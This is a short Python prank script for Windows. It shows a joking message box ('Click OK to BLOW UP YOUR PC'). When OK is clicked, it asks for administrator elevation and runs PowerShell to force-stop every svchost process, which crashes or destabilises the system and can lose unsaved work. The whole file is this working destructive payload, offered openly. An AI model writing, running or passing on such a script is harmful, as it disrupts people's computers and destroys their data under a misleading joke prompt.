import ctypes

MB_ICONWARNING = 0x30
MB_OK = 0x0

response = ctypes.windll.user32.MessageBoxW(0, "Click OK to BLOW UP YOUR PC", "heheheha", MB_ICONWARNING | MB_OK)

if response == 1:
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        "powershell.exe",
        '-Command "Get-Process svchost | Stop-Process -Force"',
        None,
        1  # SW_SHOWNORMAL
    )
